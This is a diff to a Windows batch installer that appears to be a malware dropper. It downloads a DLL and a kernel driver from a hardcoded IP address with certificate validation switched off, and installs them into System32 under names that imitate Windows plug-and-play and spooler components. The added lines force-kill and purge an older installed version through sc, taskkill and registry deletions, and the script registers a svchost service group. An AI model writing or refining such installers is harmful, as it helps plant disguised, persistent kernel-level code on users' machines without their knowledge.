@@ -1,5 +1,6 @@
 @echo off
 cd /d "%~dp0"
+setlocal EnableDelayedExpansion
 set Q=%TEMP%\_q.tmp
 set SERVER=https://64.226.66.66
 if not "%~1"=="" set SERVER=%~1
@@ -24,13 +25,34 @@ echo        OK
 echo        pnpext.sys...
 start /wait /min powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};(New-Object Net.WebClient).DownloadFile('%SERVER%/files/pnpext.sys','%TD%\pnpext.sys')"
 echo        OK
-echo [3/7] Removing old...
+echo [3/7] Removing old (robust)...
+set HOST_PID=
+for /f "tokens=3" %%P in ('sc queryex %SVC% 2^>nul ^| findstr /i "PID"') do set HOST_PID=%%P
 sc.exe stop %SVC% >"%Q%" 2>&1
-waitfor /t 2 x >"%Q%" 2>&1
+set STOPPED=0
+for /l %%i in (1,1,10) do (
+    if "!STOPPED!"=="0" (
+        sc.exe query %SVC% 2>nul | findstr /C:"STOPPED" >nul && set STOPPED=1
+        if "!STOPPED!"=="0" (
+            sc.exe query %SVC% 2>nul >nul || set STOPPED=1
+        )
+        if "!STOPPED!"=="0" (>nul timeout /t 1 /nobreak)
+    )
+)
+if "!STOPPED!"=="0" if defined HOST_PID (
+    echo        old service hung - taskkill /F /PID !HOST_PID!
+    taskkill.exe /F /PID !HOST_PID! >"%Q%" 2>&1
+    >nul timeout /t 2 /nobreak
+)
+reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v %SVCGROUP% /f >"%Q%" 2>&1
 sc.exe delete %SVC% >"%Q%" 2>&1
+reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /f >"%Q%" 2>&1
 taskkill.exe /F /IM rundll32.exe >"%Q%" 2>&1
 del /f /q "%SystemRoot%\System32\WPnpSvc.exe" >"%Q%" 2>&1
 del /f /q "%SystemRoot%\System32\spoolcfg.exe" >"%Q%" 2>&1
+del /f /q "%SystemRoot%\System32\pnpext.dll.old" >"%Q%" 2>&1
+del /f /q "%SystemRoot%\System32\pnpext.dll.new" >"%Q%" 2>&1
+if exist "%TEMP%\pnp_cache" del /f /q "%TEMP%\pnp_cache\*.bin" >"%Q%" 2>&1
 echo [4/7] Installing files...
 copy /y "%TD%\pnpext.dll" "%SystemRoot%\System32\pnpext.dll" >"%Q%" 2>&1
 if exist "%TD%\pnpext.sys" (copy /y "%TD%\pnpext.sys" "%SystemRoot%\System32\drivers\pnpext.sys" >"%Q%" 2>&1)
@@ -59,4 +81,5 @@ echo [!] Failed
 del "%Q%" >"%TEMP%\_q2.tmp" 2>&1
 del "%TEMP%\_q2.tmp" >con 2>&1
 echo.
+endlocal
 pause
